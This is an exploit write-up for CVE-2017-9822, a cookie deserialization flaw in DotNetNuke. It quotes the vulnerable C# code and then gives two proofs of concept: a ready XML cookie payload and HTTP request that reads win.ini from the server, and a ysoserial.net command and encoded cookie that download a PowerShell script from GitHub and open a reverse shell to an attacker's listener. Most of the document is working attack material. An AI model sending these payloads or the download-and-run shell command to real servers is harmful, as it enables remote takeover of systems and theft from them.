<b>[CVE-2017-9822] DotNetNuke Cookie Deserialization Remote Code Execution (RCE)</b>
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

DotNetNuke (DNN) versions between 5.0.0 - 9.3.0 are affected to deserialization vulnerability that leads to Remote Code Execution (RCE). DotNetNuke uses the `DNNPersonalization` cookie to store anonymous users’ personalization options (the options for authenticated users are stored through their profile pages). This cookie is used when the application serves a custom 404 Error page, which is also the default settings.

Vulnerable part of the C# code is illustrated as below: `DNN Platform/Library/Common/Utilities/XmlUtils.cs`

```csharp
public static Hashtable DeSerializeHashtable(string xmlSource, string rootname)
{
	var HashTable = new Hashtable();

	if (!String.IsNullOrEmpyt(xmlSource))
	{
		try
		{
			var xmlDoc = new XmlDocument();
			xmlDoc.LoadXml(xmlSource);

			foreach (XmlElement xmlItem in xmlDoc.SelectNodes(rootname + "/item"))
			{
				string key = xmlItem.GetAttribute("key");
				string typeName = xmlItem.GetAttribute("type");
				
				// Create the XmlSerializer
				var xser = new XmlSerializer(Type.GetType(typeName));

				var readder = new XmlTextReadder(new StringReader(xmlItem.InnerXml));

				// Use the Deserialize method to restore the object's state, and store it
				// in the Hashtable
				hashTable.Add(key, xser.Deserialize(reader));
			}
		}
		catch(Exception)
		{
			// Logger.Error(ex); /*Ignore Log because if failed on profile this will log on every request.*/
		}
	}

	return hashTable;
}
```
Note that fixed code can be found at [DotNetNuke github repository](https://github.com/dnnsoftware/Dnn.Platform/blob/develop/DNN%20Platform/Library/Common/Utilities/XmlUtils.cs)

The expected structure includes a `type` attribute to instruct the server which type of object to create on deserialization. The cookie is processed by the application whenever it attempts to load the current user's profile data, which occurs when DNN is configured to handle 404 errors with its built-in error page (default configuration). An attacker can leverage this vulnerability to execute arbitrary code on the system.

<b>Proof of Concept (PoC) 1:</b> Safe Mode (just detect)

In order to generate payload (to check vuln.), use [YSoSerial.net](https://github.com/pwntester/ysoserial.net) with DotNetNuke plugin

```
PS C:\ysoserial.net\ysoserial\bin\Debug> .\ysoserial.exe -p DotNetNuke --help
ysoserial.net generates deserialization payloads for a variety of .NET formatters.

Plugin:

DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)

Options:

  -m, --mode=VALUE           the payload mode: read_file, write_file,
                               run_command.
  -c, --command=VALUE        the command to be executed in run_command mode.
  -u, --url=VALUE            the url to fetch the file from in write_file
                               mode.
  -f, --file=VALUE           the file to read in read_file mode or the file
                               to write to in write_file_mode.
      --minify               Whether to minify the payloads where applicable
                               (experimental). Default: false
      --ust, --usesimpletype This is to remove additional info only when
                               minifying and FormatterAssemblyStyle=Simple.
                               Default: true
```

```
PS C:\>ysoserial.net\ysoserial\bin\Release\ysoserial.exe -p DotNetNuke -m read_file -f C:\Windows\win.ini
```

or simply, use the following payload 

```xml
<profile>
    <item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
        <ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <ExpandedElement />
            <ProjectedProperty0>
                <MethodName>WriteFile</MethodName>
                <MethodParameters>
                    <anyType xsi:type="xsd:string">C:\Windows\win.ini</anyType>
                </MethodParameters>
                <ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance>
            </ProjectedProperty0>
        </ExpandedWrapperOfFileSystemUtilsObjectDataProvider>
    </item>
</profile>
```

If everything goes well, following request will return content of win.ini file in response body.

```
GET /__ HTTP/1.1
Host: host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: dnn_IsMobile=False; DNNPersonalization=<profile><item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">C:\Windows\win.ini</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
```

```
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
Set-Cookie: .ASPXANONYMOUS=...; expires=Wed, 28-Oct-2020 03:54:58 GMT; path=/; HttpOnly
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Wed, 19 Aug 2020 17:14:58 GMT
Connection: close
Content-Length: 109

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
<b>Proof of Concept (PoC) 2:</b> Aggressive Mode (exploit with powershell reverse tcp shell)

On local machine, listen any port that you don't use

```
$ nc -nlvp 7575
```

Generate payload using [YSoSerial.net](https://github.com/pwntester/ysoserial.net) with DotNetNuke plugin

```
PS C:\ysoserial.net\ysoserial\bin\Debug> .\ysoserial.exe -p DotNetNuke -m run_command -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.101 -Port 7575"
```

Payload
```xml
<profile>
    <item key="key" type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
        <ExpandedWrapperOfObjectStateFormatterObjectDataProvider>
            <ProjectedProperty0>
                <ObjectInstance p3:type="ObjectStateFormatter" xmlns:p3="http://www.w3.org/2001/XMLSchema-instance" />
                <MethodName>Deserialize</MethodName>
                <MethodParameters>
                    <anyType xmlns:q1="http://www.w3.org/2001/XMLSchema" p5:type="q1:string" xmlns:p5="http://www.w3.org/2001/XMLSchema-instance">/wEylQkAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC3Bzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBDOlxXaW5kb3dzXFN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgaWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2FtcmF0YXNob2svbmlzaGFuZy9tYXN0ZXIvU2hlbGxzL0ludm9rZS1Qb3dlclNoZWxsVGNwLnBzMScpO0ludm9rZS1Qb3dlclNoZWxsVGNwIC1SZXZlcnNlIC1JUEFkZHJlc3MgMTkyLjE2OC4xLjEwMSAtUG9ydCA3NTc1IiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs=</anyType>
                </MethodParameters>
            </ProjectedProperty0>
        </ExpandedWrapperOfObjectStateFormatterObjectDataProvider>
    </item>
</profile>
```

```
GET /__ HTTP/1.1
Host: host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: dnn_IsMobile=False; DNNPersonalization=<profile><item key="key" type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfObjectStateFormatterObjectDataProvider><ProjectedProperty0><ObjectInstance p3:type="ObjectStateFormatter" xmlns:p3="http://www.w3.org/2001/XMLSchema-instance" /><MethodName>Deserialize</MethodName><MethodParameters><anyType xmlns:q1="http://www.w3.org/2001/XMLSchema" p5:type="q1:string" xmlns:p5="http://www.w3.org/2001/XMLSchema-instance">/wEylQkAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC3Bzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBDOlxXaW5kb3dzXFN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgaWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2FtcmF0YXNob2svbmlzaGFuZy9tYXN0ZXIvU2hlbGxzL0ludm9rZS1Qb3dlclNoZWxsVGNwLnBzMScpO0ludm9rZS1Qb3dlclNoZWxsVGNwIC1SZXZlcnNlIC1JUEFkZHJlc3MgMTkyLjE2OC4xLjEwMSAtUG9ydCA3NTc1IiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs=</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>
```

Original blogpost is available [here](https://pentest-tools.com/blog/exploit-dotnetnuke-cookie-deserialization/)<br>
Also, there is a metasploit module available for CVE-2017-9822 with Excellent ranking. You can find out ruby codes of metasploit module for [`exploit/windows/http/dnn_cookie_deserialization_rce`](https://www.exploit-db.com/exploits/48336)<br>
If you want to deep dive into CVE-2017-9822, there is a well documented [pull request](https://github.com/rapid7/metasploit-framework/pull/12096) for metasploit module
